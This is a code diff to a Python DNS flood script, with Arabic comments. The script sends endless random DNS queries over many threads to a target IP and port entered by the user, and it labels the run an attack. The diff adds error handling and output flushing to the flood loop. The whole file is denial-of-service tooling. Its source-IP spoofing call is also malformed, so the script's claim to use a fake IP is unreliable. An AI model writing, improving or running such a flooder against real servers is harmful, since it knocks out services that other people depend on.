@@ -4,10 +4,7 @@ import threading
 from colorama import Fore as F
 from concurrent.futures import ThreadPoolExecutor
 import time
-import os
 
-
-os.system('clear')
 print(f'''
 {F.GREEN}
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -31,24 +28,27 @@ def generate_fake_ip():
 def dns_flood(target_ip, target_port=53):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # استخدام UDP لأن DNS يعتمد عليه
     fake_ip = generate_fake_ip()  # IP مزيف
-    while True:
-        domain = generate_random_domain()
-        query_type = random.choice([b"\x00\x01", b"\x00\x1c", b"\x00\x0f"])  # A, AAAA, MX
-        request = (
-            b"\xAA\xAA"  # ID
-            b"\x01\x00"  # Flags
-            b"\x00\x01"  # Number of questions
-            b"\x00\x00"  # Number of answers
-            b"\x00\x00"  # Number of authority records
-            b"\x00\x00"  # Number of additional records
-        )
-        for part in domain.split("."):
-            request += bytes([len(part)]) + part.encode("utf-8")
-        request += b"\x00" + query_type + b"\x00\x01"  # Query class: IN
+    try:
+        while True:
+            domain = generate_random_domain()
+            query_type = random.choice([b"\x00\x01", b"\x00\x1c", b"\x00\x0f"])  # A, AAAA, MX
+            request = (
+                b"\xAA\xAA"  # ID
+                b"\x01\x00"  # Flags
+                b"\x00\x01"  # Number of questions
+                b"\x00\x00"  # Number of answers
+                b"\x00\x00"  # Number of authority records
+                b"\x00\x00"  # Number of additional records
+            )
+            for part in domain.split("."):
+                request += bytes([len(part)]) + part.encode("utf-8")
+            request += b"\x00" + query_type + b"\x00\x01"  # Query class: IN
 
-        # استخدام IP المزيف في الهجوم
-        sock.sendto(request, (target_ip, target_port), 0, (fake_ip, 0))
-        print(f"{F.CYAN}Request Sent!{F.RESET} | Fake IP: {F.YELLOW}{fake_ip}{F.RESET} | Domain: {F.GREEN}{domain}{F.RESET}")
+            # استخدام IP المزيف في الهجوم
+            sock.sendto(request, (target_ip, target_port), 0, (fake_ip, 0))
+            print(f"{F.CYAN}Request Sent!{F.RESET} | Fake IP: {F.YELLOW}{fake_ip}{F.RESET} | Domain: {F.GREEN}{domain}{F.RESET}", flush=True)
+    except Exception as e:
+        print(f"{F.RED}Error: {e}{F.RESET}", flush=True)
 
 # تشغيل الهجوم عبر عدة threads باستخدام ThreadPoolExecutor
 def start_dns_flooding(target_ip, thread_count, duration):
@@ -64,4 +64,4 @@ if __name__ == "__main__":
     attack_duration = int(input(f"{F.CYAN}[?]{F.RESET} Duration (seconds): {F.GREEN}"))
     
     start_dns_flooding(target_ip, num_threads, attack_duration)
-    print(f"{F.CYAN}Attack Finished!{F.RESET}")
+    print(f"{F.CYAN}Attack Finished!{F.RESET}", flush=True)
